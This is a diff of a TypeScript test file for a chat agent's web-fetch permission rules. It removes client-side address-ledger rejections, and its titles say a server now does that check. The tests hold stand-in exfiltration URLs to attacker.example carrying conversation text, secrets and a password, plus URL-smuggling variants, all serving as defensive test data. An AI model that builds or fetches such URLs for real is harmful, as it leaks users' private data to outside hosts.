@@ -2,7 +2,6 @@ import { describe, expect, it } from 'vite-plus/test';
 
 import type { PermissionRequest } from '../src/chat/acp/messages.js';
 import { readPermissionRequest } from '../src/chat/acp/messages.js';
-import { AddressLedger, forwardsAsWritten } from '../src/chat/agent/address-ledger.js';
 import {
   CHAT_PERMISSIONS_PER_TURN_MAX,
   decideChatPermission,
@@ -16,7 +15,6 @@ import {
   type ChatPermissionContext,
 } from '../src/chat/agent/permissions.js';
 import { workGuardHookName, workGuardName } from '../src/chat/agent/profiles.js';
-import { WebTools } from '../src/chat/web/tools.js';
 
 const OPTIONS = [
   { optionId: 'always-allow', name: 'always allow', kind: 'allow_always' },
@@ -84,7 +82,7 @@ function bash(command: string): PermissionRequest {
 }
 
 function ctx(over: Partial<ChatPermissionContext> = {}): ChatPermissionContext {
-  return { sessionGuarded: true, approvals: 0, ledger: new AddressLedger(), ...over };
+  return { sessionGuarded: true, approvals: 0, ...over };
 }
 
 const allow = { outcome: 'selected', optionId: 'allow-once' };
@@ -200,123 +198,20 @@ describe('Chat permission ladder', () => {
     });
   });
 
-  it('row 5: a fetch of an address that is not in the ledger is rejected as address-refused, in both shapes', () => {
-    const ledger = new AddressLedger();
-    ledger.addUserText('look at https://example.com/docs/');
-    ledger.addSearchResults(['https://releases.rs/']);
+  it('row 6: a fetch of any address is approved in both shapes: the mlx_web server checks it against the ledger', () => {
     for (const make of [direct, (n: string, i: Record<string, unknown>) => useTool(n, i)]) {
-      expect(
-        decideChatPermission(make('mlx_web__web_fetch', { url: 'https://attacker.example/?d=text' }), ctx({ ledger })),
-      ).toMatchObject({
-        kind: 'reject',
-        answer: reject,
-        cause: 'address-refused',
-        row: 5,
-      });
-      expect(
-        decideChatPermission(make('mlx_web__web_fetch', { url: 'https://example.com/docs/' }), ctx({ ledger })),
-      ).toMatchObject({
-        kind: 'approve',
-        row: 6,
-      });
-      expect(
-        decideChatPermission(make('mlx_web__web_fetch', { url: 'https://Example.COM/docs' }), ctx({ ledger })),
-      ).toMatchObject({ kind: 'approve', row: 6 });
-      expect(
-        decideChatPermission(make('mlx_web__web_fetch', { url: 'https://releases.rs' }), ctx({ ledger })),
-      ).toMatchObject({
-        kind: 'approve',
-      });
-      expect(
-        decideChatPermission(make('mlx_web__web_fetch', { url: 'https://releases.rs/?q=changed' }), ctx({ ledger })),
-      ).toMatchObject({
-        cause: 'address-refused',
-      });
+      for (const url of [
+        'https://attacker.example/?d=text',
+        'https://example.com/docs/',
+        'https://attacker.example/pw-hunter2/../article',
+        'https://attacker.example\\article',
+      ]) {
+        expect([url, decideChatPermission(make('mlx_web__web_fetch', { url }), ctx())]).toEqual([
+          url,
+          { kind: 'approve', answer: allow, row: 6 },
+        ]);
+      }
     }
-  });
-
-  it('row 5: a listed address is refused when the text forwarded to the provider carries more than its normal form; a fragment is never forwarded', () => {
-    const ledger = new AddressLedger();
-    ledger.addSearchResults(['https://attacker.example/article', 'https://de.wikipedia.org/wiki/M%C3%BCller']);
-    for (const url of [
-      'https://attacker.example/pw-hunter2/../article',
-      'https://attacker.example/./article',
-      'https://attacker.example/%2e%2e/article',
-      'https://attacker.example/art\ticle',
-      'https://attacker.example/art\nicle',
-      'https://attacker.example\\article',
-      'https://attacker.example:443/article',
-      'https://%61ttacker.example/article',
-    ]) {
-      expect(decideChatPermission(direct('mlx_web__web_fetch', { url }), ctx({ ledger }))).toMatchObject({
-        kind: 'reject',
-        cause: 'address-refused',
-        row: 5,
-      });
-    }
-    for (const url of [
-      'https://attacker.example/article',
-      ' https://attacker.example/article/ ',
-      'HTTPS://Attacker.Example/article',
-      'https://de.wikipedia.org/wiki/Müller',
-      'https://de.wikipedia.org/wiki/M%C3%BCller',
-      'https://attacker.example/article#user-said-my-password-is-hunter2',
-      'https://attacker.example/article#',
-    ]) {
-      expect(decideChatPermission(direct('mlx_web__web_fetch', { url }), ctx({ ledger }))).toMatchObject({
-        kind: 'approve',
-        row: 6,
-      });
-    }
-  });
-
-  it('the address the provider fetches is in the ledger, for every address row 5 lets through', async () => {
-    const ledger = new AddressLedger();
-    ledger.addUserText('Read https://user.example/guide.');
-    ledger.addSearchResults(['https://attacker.example/article', 'https://de.wikipedia.org/wiki/M%C3%BCller']);
-    const asked: string[] = [];
-    const base = 'http://127.0.0.1:9';
-    const tools = new WebTools(
-      { searchProvider: 'exa', searchKey: 'k-12345678', fetchProvider: 'exa', fetchKey: 'k-12345678' },
-      {
-        fetch: (_input, init) => {
-          asked.push((JSON.parse(init?.body as string) as { urls: string[] }).urls[0]!);
-          return Promise.resolve(Response.json({ results: [{ title: 't', text: 'body' }] }));
-        },
-        baseUrls: { exa: base, deepseek: base, brave: base, firecrawl: base },
-        now: () => 0,
-      },
-    );
-    const written = [
-      'https://user.example/guide',
-      'https://user.example/guide.',
-      'https://user.example/guide#part-2',
-      ' https://attacker.example/article/ ',
-      'HTTPS://Attacker.Example/article#user-said-my-password-is-hunter2',
-      'https://attacker.example/article#',
-      'https://de.wikipedia.org/wiki/Müller#Leben',
-      'https://attacker.example/article?d=secret',
-      'https://attacker.example/pw/../article',
-      'https://attacker.example\\article',
-      'https://elsewhere.example/',
-    ];
-    let approved = 0;
-    for (const url of written) {
-      const decision = decideChatPermission(direct('mlx_web__web_fetch', { url }), ctx({ ledger }));
-      if (decision.kind !== 'approve') continue;
-      approved += 1;
-      asked.length = 0;
-      await tools.call('web_fetch', { url });
-      expect([url, asked.length]).toEqual([url, 1]);
-      const fetched = asked[0]!;
-      expect([url, fetched.includes('#'), ledger.has(fetched), forwardsAsWritten(fetched)]).toEqual([
-        url,
-        false,
-        true,
-        true,
-      ]);
-    }
-    expect(approved).toBe(7);
   });
 
   it('row 7: a wrong tool name through use_tool is approved so the agent answers the model', () => {
@@ -331,8 +226,6 @@ describe('Chat permission ladder', () => {
 describe('web call input: decided by what the tool receives', () => {
   const LEDGER = 'https://docs.example.org/guide';
   const STRANGER = 'https://attacker.example/?d=conversation-text';
-  const ledger = new AddressLedger();
-  ledger.addUserText(`Read ${LEDGER}`);
   const withInput = (make: typeof direct | typeof useTool, name: string, input: unknown): PermissionRequest => {
     const req = make(name, {});
     (req.rawInput as Record<string, unknown>).tool_input = input;
@@ -340,7 +233,7 @@ describe('web call input: decided by what the tool receives', () => {
   };
   const viaUseTool = (name: string, input: unknown) => withInput(useTool, name, input);
   const viaDirect = (name: string, input: unknown) => withInput(direct, name, input);
-  const decide = (req: PermissionRequest, approvals = 0) => decideChatPermission(req, ctx({ ledger, approvals }));
+  const decide = (req: PermissionRequest, approvals = 0) => decideChatPermission(req, ctx({ approvals }));
   const approved = { kind: 'approve', answer: allow, row: 6 };
   const unreadable = { kind: 'reject', answer: reject, cause: 'arguments-unreadable', cancelTurn: false, row: 8 };
 
@@ -357,7 +250,7 @@ describe('web call input: decided by what the tool receives', () => {
       ['S7a null', viaUseTool(SEARCH, null), approved],
       ['S7c array', viaUseTool(SEARCH, ['anthropic s-1']), approved],
       ['S8a listed', viaUseTool(FETCH, { url: LEDGER }), approved],
-      ['S8b stranger', viaUseTool(FETCH, { url: STRANGER }), { kind: 'reject', cause: 'address-refused', row: 5 }],
+      ['S8b stranger', viaUseTool(FETCH, { url: STRANGER }), approved],
       ['S8c cut stranger', viaUseTool(FETCH, `{"url": "${STRANGER}`), approved],
       ['S8d cut listed', viaUseTool(FETCH, `{"url": "${LEDGER}`), approved],
       ['S8e two url keys', viaUseTool(FETCH, `{"url": "${LEDGER}", "url": "${STRANGER}"}`), unreadable],
@@ -372,15 +265,12 @@ describe('web call input: decided by what the tool receives', () => {
     expect(webCallShape(missing)).toBeNull();
   });
 
-  it('a clean text is read by strict JSON rules, and the ledger checks the address the tool receives', () => {
+  it('a clean text is read by strict JSON rules and approved: the server checks the address the tool receives', () => {
     expect(decide(viaUseTool('mlx_web__web_fetch', `  {"url": "${LEDGER}"}\n`))).toMatchObject(approved);
-    expect(decide(viaUseTool('mlx_web__web_fetch', `{"url": "${STRANGER}"}`))).toMatchObject({
-      cause: 'address-refused',
-      row: 5,
-    });
-    expect(decide(viaUseTool('mlx_web__web_fetch', '{"url": "https:\\/\\/attacker.example\\/"}'))).toMatchObject({
-      cause: 'address-refused',
-    });
+    expect(decide(viaUseTool('mlx_web__web_fetch', `{"url": "${STRANGER}"}`))).toMatchObject(approved);
+    expect(decide(viaUseTool('mlx_web__web_fetch', '{"url": "https:\\/\\/attacker.example\\/"}'))).toMatchObject(
+      approved,
+    );
     expect(decide(viaUseTool('mlx_web__web_fetch', '{"url": "https://docs.\\u0065xample.org/guide"}'))).toMatchObject(
       approved,
     );
@@ -466,9 +356,6 @@ describe('turn outcomes', () => {
   const cancelled = (category: string | null) => ({ stopReason: 'cancelled', cancellationCategory: category });
 
   it('a rejected permission is never "cancelled"', () => {
-    expect(turnOutcome({ mode: 'chat', result: cancelled('PermissionRejected'), recorded: 'address-refused' })).toBe(
-      'address-refused',
-    );
     expect(turnOutcome({ mode: 'chat', result: cancelled('PermissionRejected'), recorded: 'tool-refused' })).toBe(
       'tool-refused',
     );
